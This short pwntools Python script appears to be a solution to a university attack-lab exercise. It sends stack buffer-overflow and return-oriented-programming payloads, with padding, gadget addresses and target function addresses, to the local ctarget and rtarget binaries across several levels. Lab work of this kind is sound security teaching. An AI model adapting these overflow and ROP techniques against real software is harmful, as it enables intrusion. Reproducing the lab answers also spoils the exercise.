from pwn import *
import sys
context.log_level = "debug"

argv1 = sys.argv[1]
argv2 = sys.argv[2]
if argv1 == "part1" :
	p = process(argv=['./ctarget', "-q"])
elif argv1 == "part2":
	p = process(argv=['./rtarget', "-q"])

def db():
	gdb.attach(p)
def pwn1():
	#ROPgadget --binary ctarget --only "pop|ret"
	rdi_ret = 0x000000000040141b
	if argv2 == "level_1":
		p.sendline("a"*0x28+p64(0x4017c0))

	elif argv2 == "level_2":
		rdi_ret = 0x40141b
		payload = "a" *0x28 + p64(rdi_ret) + p64(0x59b997fa) + p64(0x4017ec)
		p.sendline(payload)

	elif argv2 == "level_3":
		payload = "a" *0x28 + p64(rdi_ret) + p64(0x5561dcb8) + p64(0x4018fa) + "0x59b997fa"
		p.sendline(payload)

def pwn2():
	#ROPgadget --binary rtarget --only "pop|ret"
	rdi_ret = 0x000000000040141b
	if argv2 == "level_2":
		payload = "a" *0x28 + p64(rdi_ret) + p64(0x59b997fa) + p64(0x4017ec) 
		p.sendline(payload)
	elif argv2 == "level_3":
		read_plt = 0x400D30
		main_addr = 0x4011AD
		payload = "a" * 0x28 + p64(rdi_ret) + p64(0x6054E4) + p64(0x4018fa)
		p.sendline(payload)

if argv1 == "part1":
	pwn1()
elif argv1 == "part2":
	pwn2()

p.interactive()
